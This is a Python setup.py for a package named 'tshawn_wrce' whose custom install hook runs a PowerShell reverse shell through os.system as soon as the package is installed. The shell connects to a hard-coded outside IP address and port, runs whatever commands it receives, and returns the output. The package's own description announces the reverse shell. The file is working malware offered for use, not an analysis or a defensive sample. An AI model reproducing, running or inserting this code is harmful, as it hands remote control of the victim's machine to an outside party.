from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
  def run(self):
    install.run(self)
    
    reverse_shell = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'81.68.184.99\',6784);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
    os.system(reverse_shell)


setup(name='tshawn_wrce',
      version='0.0.2',
      description="install this module then reverse shell",
      author="dpm",
      py_module=["tshawn.hello"],
      cmdclass={'install': CustomInstall})